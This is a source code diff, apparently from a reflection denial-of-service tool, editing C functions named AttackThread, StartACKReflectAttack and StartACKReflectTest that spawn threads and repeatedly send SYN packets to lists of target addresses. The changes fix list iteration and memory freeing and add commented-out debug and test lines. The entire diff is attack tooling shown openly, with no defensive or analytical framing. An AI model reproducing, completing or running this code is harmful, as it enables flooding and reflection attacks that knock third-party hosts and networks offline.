@@ -206,7 +206,6 @@ static int AttackThread(pSYNStruct syn_struct)
     pStrNode str_node = syn_struct->str_header->next;
     pSplitURLOutput split_result;
 
-    DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "ATTACK!");
     DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "AttackThread start sending data...");
     extern void FreeSplitURLBuff(pSplitURLOutput p);
     extern int SplitURL(const char *url, pSplitURLOutput *output);
@@ -258,6 +257,9 @@ static int AttackThread(pSYNStruct syn_struct)
         syn_struct->dst_port = split_result->port;
         FreeSplitURLBuff(split_result);
 
+        // for test
+        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
+
         for (i = 0; i < syn_struct->each_ip_repeat; i++)
         {
             if (SendSYN(syn_struct, syn_struct->debug_level))
@@ -266,8 +268,9 @@ static int AttackThread(pSYNStruct syn_struct)
                 return 1;
             }
         }
+
+        str_node = str_node->next;
     }
-    FreeSYNStructBuff(syn_struct);
     return 0;
 }
 
@@ -446,12 +449,11 @@ int StartACKReflectAttack(const pInput input)
     // str_header no longer used
     free(str_header);
 
-    tmp_list = list;
-
     // unlimit loop
     for (;;)
     {
         // only one process
+        tmp_list = list;
         if (input->max_process <= 1)
         {
             // start again
@@ -463,6 +465,7 @@ int StartACKReflectAttack(const pInput input)
                  */
                 syn_struct->str_header = tmp_list->list;
                 tmp_list = tmp_list->next;
+                //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);
 
                 //input->serial_num = (i * input->max_thread) + j;
                 if (pthread_attr_init(&attr))
@@ -488,6 +491,8 @@ int StartACKReflectAttack(const pInput input)
                     return 1;
                 }
                 pthread_attr_destroy(&attr);
+                // for the test
+                //sleep(2);
             }
             //pthread_detach(tid);
             // join them all
@@ -495,7 +500,10 @@ int StartACKReflectAttack(const pInput input)
             {
                 pthread_join(tid[j], NULL);
             }
+            // exit for test
+            return 0;
         }
+        // many process: actually this is not neccessary
         else
         {
             // muti process
@@ -553,6 +561,7 @@ int StartACKReflectAttack(const pInput input)
             }
         }
     }
+    FreeSYNStructBuff(syn_struct);
     FreeIPListBuff(list);
     return 0;
 }
@@ -628,8 +637,18 @@ int StartACKReflectTest(const pInput input)
         DisplayError("SplitIPForThread failed");
         return 1;
     }
+    pIPList_Thread tmp_list = list;
+    int i;
 
-    //AttackThread(syn_struct);
+    for (i = 0; i < input->max_thread; i++)
+    {
+        syn_struct->str_header = tmp_list->list;
+        tmp_list = tmp_list->next;
+        AttackThread(syn_struct);
+    }
+
+    FreeSYNStructBuff(syn_struct);
+    FreeIPListBuff(list);
 
     return 0;
 }
